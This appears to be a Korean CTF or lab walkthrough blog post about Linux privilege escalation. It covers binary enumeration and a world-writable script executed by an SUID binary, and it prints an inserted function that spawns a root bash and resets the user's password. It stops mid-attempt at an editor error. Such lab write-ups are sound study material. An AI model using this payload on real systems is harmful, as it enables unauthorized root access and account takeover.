-rwxr-xr-x 1 root root 99296 May 9 2023 xtables-legacy-multi
lrwxrwxrwx 1 root root 17 May 9 2023 xtables-monitor -> xtables-nft-multi
-rwxr-xr-x 1 root root 220488 May 9 2023 xtables-nft-multi
-rwxr-xr-x 1 root root 10232 Mar 15 2018 zerofree
-rwxr-xr-x 1 root root 63784 Jan 29 2025 zic
-rwxr-xr-x 1 root root 117088 Apr 9 2024 zramctl

# 빨간색 글씨 위주로 파악 -> 빨강색 : 95% 이상이 공격벡터랑 직접 연결 됨

- pppd -> GTFObins 에 없음 pass!
  ![](https://velog.velcdn.com/images/agnusdei1207/post/0e1eb6f1-d62a-4ab2-8602-da90a55f380d/image.png)

- run_container 도 없음!
  ![](https://velog.velcdn.com/images/agnusdei1207/post/390abc0a-d1a4-414a-afd4-b42b6f5e070f/image.png)
  ![](https://velog.velcdn.com/images/agnusdei1207/post/c7479e71-0bfc-4bc0-8fb9-9a43e440ef2c/image.png)

# 둘 다 GTFObins 에 없음 -> 직접 분석 및 공격해야 할 대상

- /opt/run_container.sh
  ![](https://velog.velcdn.com/images/agnusdei1207/post/3df4dea1-7cdd-4e76-9a7b-179ffab8313c/image.png)

> Interesting writable files owned by me or writable by everyone

think@ip-10-201-11-134:/dev/shm$ cat /opt/run_container.sh

```bash
#!/bin/bash

# Function to list Docker containers

list_containers() {
if [ -z "$(docker ps -aq)" ]; then
docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
fi
echo "List of Docker containers:"
docker ps -a --format "ID: {{.ID}} | Name: {{.Names}} | Status: {{.Status}}"
echo ""
}

# Function to prompt user for container ID

prompt_container_id() {
read -p "Enter the ID of the container or leave blank to create a new one: " container_id
validate_container_id "$container_id"
}

# Function to display options and perform actions

select_action() {
echo ""
echo "OPTIONS:"
local container_id="$1"
PS3="Choose an action for a container: "
options=("Start Container" "Stop Container" "Restart Container" "Create Container" "Quit")

    select opt in "${options[@]}"; do
        case $REPLY in
            1) docker start "$container_id"; break ;;
            2)  if [ $(docker ps -q | wc -l) -lt 2 ]; then
             echo "No enough containers are currently running."
                  exit 1
    fi
                docker stop "$container_id"
                break ;;
            3) docker restart "$container_id"; break ;;
            4) echo "Creating a new container..."
               docker run -d --restart always -p 80:80 -v /home/think:/home/think spip-image:latest
               break ;;
            5) echo "Exiting..."; exit ;;
            *) echo "Invalid option. Please choose a valid option." ;;
        esac
    done

}

# Main script execution

list_containers
prompt_container_id # Get the container ID from prompt_container_id function
select_action "$container_id"  # Pass the container ID to select_action function
think@ip-10-201-11-134:/dev/shm$
```

> /opt/run_container.sh 파일이 모두 쓰기 가능(-rwxrwxrwx)이므로, 아무나 내용을 수정할 수 있습니다.
> /usr/sbin/run_container 바이너리가 SUID/SGID로 실행되면, 이 스크립트가 root 권한으로 실행될 수 있습니다.
> /usr/sbin/run_container 바이너리가 SUID/SGID로 설정되어 있고,
> 이 바이너리가 /opt/run_container.sh 스크립트를 실행하는데,
> /opt/run_container.sh가 모두 쓰기 가능(-rwxrwxrwx)이면,
> 스크립트에 bash 실행 코드를 넣고 SUID 바이너리를 실행하면,
> bash가 root 권한으로 실행되어 root 쉘을 획득할 수 있습니다.
> 리눅스에서 SUID가 설정된 바이너리(예: /usr/sbin/run_container)를 실행하면,
> 실행하는 사용자가 누구든 해당 바이너리의 소유자(여기서는 root) 권한으로 동작합니다.
> 이 바이너리가 /opt/run_container.sh 스크립트를 실행할 때,
> 스크립트 안에 bash 명령이 있으면,
> 그 bash 프로세스도 root 권한으로 실행됩니다.
> SUID/SGID 바이너리 실행 → root 권한 획득
> 이 바이너리가 모두 쓰기 가능한 스크립트 실행
> 스크립트에 bash 삽입 → bash가 root로 실행됨
> root 쉘 획득
> 이게 바로 OSCP에서 자주 나오는 "SUID 바이너리 + 쓰기 가능한 스크립트" 권한 상승 원리입니다.

# 그렇다면? 메소드 하나 추가해서 권한 상승하기

-rwxr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bash

```bash
# 아래 코드 넣고 다른 코드보다 먼저 실행되게 수정
get_root_shell() {
    /bin/bash
    # 비밀번호도 새로 설정
    echo "think:1234" | chpasswd
}

get_root_shell
```

![](https://velog.velcdn.com/images/agnusdei1207/post/76a063b5-25ea-40ae-b997-9854aa9d17d3/image.png)

"/opt/run_container.sh" E509: Cannot create backup file (add ! to override)
Press ENTER or type command to continue
![](https://velog.velcdn.com/images/agnusdei1207/post/eba3e680-5af7-456e-bdce-b9b61d09d257/image.png)

# 권한이 있는데 왜 안 되지?

think@ip-10-201-11-134:/dev/shm$ ls -l /opt/run_container.sh
-rwxrwxrwx 1 root root 1715 Jan 10 2024 /opt/run_container.sh
think@ip-10-201-11-134:/dev/shm$

sudo ssh -i id_rsa think@10.201.11.134
